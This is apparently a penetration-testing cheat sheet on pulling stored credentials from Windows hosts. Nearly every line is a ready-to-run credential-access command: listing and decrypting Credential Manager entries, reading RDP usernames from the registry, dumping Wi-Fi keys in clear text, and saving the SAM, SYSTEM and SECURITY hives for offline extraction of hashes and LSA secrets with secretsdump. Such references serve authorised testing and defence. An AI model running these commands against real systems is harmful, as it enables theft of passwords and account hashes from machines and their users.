# Stored Credentials

## Commands

<table data-header-hidden data-full-width="true"><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><mark style="color:yellow;"><code>cmdkey /list</code></mark></td><td>Lists credentials stored in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>Get-StoredCredential</code></mark></td><td>Lists credentials stored in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>Get-StoredCredential -Target "TargetName"</code></mark></td><td>Lists credentials for a specific target in Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>$cred = Get-StoredCredential -Target "TargetName"</code></mark></td><td>Retrieves credentials for a specific target from Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>$cred.GetNetworkCredential().Password</code></mark></td><td>Retrieves and decrypts the password for a specific target from Windows Credential Manager.</td></tr><tr><td><mark style="color:yellow;"><code>wmic path Win32_VaultCredential</code></mark></td><td>Lists credentials stored in Windows Vault using WMI (may not work on all systems).</td></tr><tr><td><mark style="color:yellow;"><code>reg.exe save hklm\sam C:\temp\sam.save</code></mark></td><td>Copies SAM. The SAM can be decrypted using secretsdump.py from Impacket.</td></tr><tr><td><mark style="color:yellow;"><code>reg.exe save hklm\system C:\temp\system.save</code></mark></td><td>Copies System Registry.</td></tr></tbody></table>

Lists credentials stored in Windows Vault using CIM-Instance (may not work on all systems):

{% code overflow="wrap" %}
```powershell
Get-CimInstance -Namespace "Root\Microsoft\Windows\Security\*" -ClassName Win32_VaultCredential
```
{% endcode %}

Lists usernames used for Remote Desktop connections from the registry using PowerShell:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client\Default"
```

Decrypts and retrieves the username for a specific RDP server from the registry using PowerShell:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers\ServerName" -Name "UsernameHint"
```

Lists Wi-Fi network profiles and their passwords using PowerShell (requires admin privileges):

{% code overflow="wrap" %}
```powershell
(netsh wlan show profiles) | ForEach-Object { $_; (netsh wlan show profile name="$($_.Trim())" key=clear) }
```
{% endcode %}

## LSA Secrets

LSA Secrets is used by the Local Security Authority (LSA) as storage, and oftentimes information such as auto-login service accounts or VPN credentials may be stored here:

To extract LSA secrets you need SYSTEM privs:

```powershell
reg.exe save hklm\security C:\temp\security.save
```

```powershell
reg.exe save hklm\system C:\temp\system.save
```

LSA Secrets is stored within the Security Registry.

We still need the Syskey from the System hive so we can decrypt the contents of LSA Secrets.

We can then extract the LSA Secrets using secretsdump from Impacket with the command:

```powershell
python3 secretsdump.py -security security.save -system system.save LOCAL
```

## Copy SAM and System Hive

To backup the SAM and SYSTEM hashes, we can use the following commands:

```powershell
reg save hklm\system C:\Users\backup\system.hive
```

```powershell
reg save hklm\sam C:\Users\backup\sam.hive
```
